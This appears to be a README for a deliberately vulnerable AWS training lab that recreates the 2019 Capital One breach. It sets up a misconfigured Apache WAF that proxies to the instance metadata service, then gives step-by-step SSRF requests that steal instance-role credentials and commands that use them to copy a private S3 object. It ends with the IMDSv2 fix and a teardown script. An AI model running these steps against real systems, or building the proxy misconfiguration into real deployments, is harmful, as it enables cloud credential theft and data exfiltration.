# Capital One–shaped WAF SSRF lab (IMDSv1)

Disposable AWS lab that reconstructs the **2019 Capital One** entry:

1. A **WAF on EC2** (Apache httpd reverse proxy, ModSecurity if the package is there).
2. A **misconfiguration**: the WAF proxies `/latest/` to `http://169.254.169.254/latest/` — SSRF to IMDS.
3. **IMDSv1** (`HttpTokens=optional`).
4. Instance role **`capone-WAF-Role`** that can list buckets and read one private object.

This is not Capital One’s exact ModSecurity ruleset (that was never published). It is the same shape: a WAF/reverse proxy on EC2 that will fetch IMDS on the attacker’s behalf, then an over-privileged WAF role.

**Do not run this in production. Tear it down when you are done. Port 80 is open.**

## One command

```bash
git clone https://github.com/Pranav-Thorve/imdsv1-ssrf-lab.git
cd imdsv1-ssrf-lab
chmod +x setup.sh destroy.sh
./setup.sh
```

Needs AWS CLI v2 credentials that can create EC2, IAM, S3, and a security group in the default VPC of `us-east-1` (override with `AWS_REGION`).

## What you do

WAF home: `http://<PUBLIC_IP>/`

In the **browser address bar** (the WAF is reverse-proxying this path to IMDS):

```
http://<PUBLIC_IP>/latest/meta-data/iam/security-credentials/
```

Then append the role name (`capone-WAF-Role`). The body is the instance-role JSON.

Export those keys, `unset AWS_PROFILE`, then:

```bash
aws sts get-caller-identity
aws s3 ls
aws s3 ls s3://<lab-bucket> --recursive
aws s3 cp s3://<lab-bucket>/secret/customer-records.txt -
```

Require IMDSv2:

```bash
aws ec2 modify-instance-metadata-options --instance-id <id> --http-tokens required
```

Reload the same `/latest/` URLs. Expect **401**.

## Destroy

```bash
./destroy.sh
```
